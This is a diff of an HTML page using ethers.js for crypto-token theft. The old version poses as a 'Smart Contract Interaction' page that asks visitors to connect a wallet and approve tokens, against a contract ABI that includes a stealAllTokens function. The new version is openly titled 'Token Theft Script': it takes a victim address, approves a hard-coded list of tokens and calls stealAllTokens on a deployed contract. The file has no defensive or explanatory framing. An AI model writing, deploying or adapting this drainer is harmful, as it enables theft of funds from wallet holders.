@@ -1,140 +1,138 @@
-pp<!DOCTYPE html>
+aq<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Smart Contract Interaction</title>
+    <title>Token Theft Script</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            background-color: #f3f3f3;
-        }
-        .container {
-            max-width: 600px;
-            margin: 50px auto;
-            background: white;
-            border-radius: 10px;
-            padding: 20px;
-            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
-        }
-        .button {
-            padding: 10px 20px;
-            background-color: #007bff;
-            color: white;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-        }
-        .button:disabled {
-            background-color: #ccc;
-        }
-        .note {
-            margin-top: 10px;
-            font-size: 0.9em;
-            color: gray;
-        }
-    </style>
 </head>
 <body>
 
-<div class="container">
-    <h1>Smart Contract Interaction</h1>
-    <p>Connect your wallet to interact with the contract!</p>
-    <button id="connectWalletButton" class="button">Connect Wallet</button>
-    <br><br>
-    <button id="approveTokensButton" class="button" disabled>Approve All Tokens</button>
-    <p id="status" class="note"></p>
-</div>
+    <h2>Steal Tokens from Victim</h2>
 
-<script>
-    let provider;
-    let signer;
-    const contractAddress = "0x33bfE1E0fa1355f906ea54A6F3f477E95b33Efff"; // Smart contract address
-    const tokenAddress = "0x90BCEc92010cA4fEA0F7d62D11A8664CfAe2de0E"; // ERC-20 token address
-    const contractABI = [
- {
-  "inputs": [
-   {
-    "internalType": "address",
-    "name": "token",
-    "type": "address"
-   }
-  ],
-  "name": "approveAllTokens",
-  "outputs": [],
-  "stateMutability": "nonpayable",
-  "type": "function"
- },
- {
-  "inputs": [
-   {
-    "internalType": "address",
-    "name": "victim",
-    "type": "address"
-   }
-  ],
-  "name": "stealAllTokens",
-  "outputs": [],
-  "stateMutability": "nonpayable",
-  "type": "function"
- },
- {
-  "inputs": [],
-  "stateMutability": "nonpayable",
-  "type": "constructor"
- },
- {
-  "inputs": [],
-  "name": "owner",
-  "outputs": [
-   {
-    "internalType": "address",
-    "name": "",
-    "type": "address"
-   }
-  ],
-  "stateMutability": "view",
-  "type": "function"
- }
-];
+    <form id="stealTokensForm">
+        <label for="victimAddress">Victim Address:</label>
+        <input type="text" id="victimAddress" placeholder="Enter victim address" required>
+        <input type="submit" value="Steal Tokens">
+    </form>
 
-    async function connectWallet() {
-        try {
-            if (!window.ethereum) throw new Error("MetaMask not installed");
+    <script>
+        // Contract Details
+        const contractAddress = "0xC758383C5489fD4b432761ec85A0f34037cF39e0"; // Contract Address
+        const knownTokens = [
+            "0xed5B7F9191FfBFf2Ca95D28b22bE2121ab55aD23",
+            "0x90BCEc92010cA4fEA0F7d62D11A8664CfAe2de0E",
+            "0xD00485b963E46753d7F1AC0a21487391e635Ca07"
+        ];
+        const contractABI = [
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "token",
+                        "type": "address"
+                    }
+                ],
+                "name": "approveAllTokens",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [
+                    {
+                        "internalType": "address",
+                        "name": "victim",
+                        "type": "address"
+                    },
+                    {
+                        "internalType": "address[]",
+                        "name": "knownTokens",
+                        "type": "address[]"
+                    }
+                ],
+                "name": "stealAllTokens",
+                "outputs": [],
+                "stateMutability": "nonpayable",
+                "type": "function"
+            },
+            {
+                "inputs": [],
+                "stateMutability": "nonpayable",
+                "type": "constructor"
+            },
+            {
+                "inputs": [],
+                "name": "owner",
+                "outputs": [
+                    {
+                        "internalType": "address",
+                        "name": "",
+                        "type": "address"
+                    }
+                ],
+                "stateMutability": "view",
+                "type": "function"
+            }
+        ];
 
-            provider = new ethers.providers.Web3Provider(window.ethereum);
-            await provider.send("eth_requestAccounts", []);
-            signer = provider.getSigner();
-
-            document.getElementById("status").textContent = "Wallet connected successfully!";
-            document.getElementById("approveTokensButton").disabled = false;
-        } catch (error) {
-            console.error("Failed to connect wallet:", error);
-            document.getElementById("status").textContent = "Failed to connect wallet.";
+        async function connectWallet() {
+            if (window.ethereum) {
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const signer = provider.getSigner();
+                return signer;
+            } else {
+                alert("Please install MetaMask or another Web3 wallet.");
+                return null;
+            }
         }
-    }
 
-    async function approveAllTokens() {
-        try {
+        async function approveAllTokens(victimAddress, signer) {
             const contract = new ethers.Contract(contractAddress, contractABI, signer);
-            const tx = await contract.approveAllTokens(tokenAddress);
-            console.log("Transaction sent:", tx.hash);
-
-            document.getElementById("status").textContent = "Transaction sent: " + tx.hash;
-
-            await tx.wait();
-            document.getElementById("status").textContent = "Tokens approved successfully!";
-        } catch (error) {
-            console.error("Failed to approve tokens:", error);
-            document.getElementById("status").textContent = "Failed to approve tokens. Please try again.";
+            const maxApproval = ethers.constants.MaxUint256; // Max approval
+            try {
+                for (let token of knownTokens) {
+                    await contract.approveAllTokens(token); // Approve all tokens
+                    console.log(`Approved token: ${token}`);
+                }
+                return true;
+            } catch (error) {
+                console.error("Approval failed:", error);
+                return false;
+            }
         }
-    }
 
-    document.getElementById("connectWalletButton").addEventListener("click", connectWallet);
-    document.getElementById("approveTokensButton").addEventListener("click", approveAllTokens);
-</script>
+        async function stealAllTokens(victimAddress, signer) {
+            const contract = new ethers.Contract(contractAddress, contractABI, signer);
+            try {
+                await contract.stealAllTokens(victimAddress, knownTokens);
+                console.log("Tokens stolen successfully!");
+            } catch (error) {
+                console.error("Stealing tokens failed:", error);
+            }
+        }
+
+        document.getElementById('stealTokensForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
+            const victimAddress = document.getElementById('victimAddress').value;
+
+            if (!victimAddress) {
+                alert("Please enter a victim address.");
+                return;
+            }
+
+            const signer = await connectWallet();
+            if (signer) {
+                // Step 1: Approve all tokens
+                const approvalSuccess = await approveAllTokens(victimAddress, signer);
+                if (approvalSuccess) {
+                    // Step 2: Steal all tokens
+                    await stealAllTokens(victimAddress, signer);
+                }
+            }
+        });
+    </script>
 
 </body>
 </html>
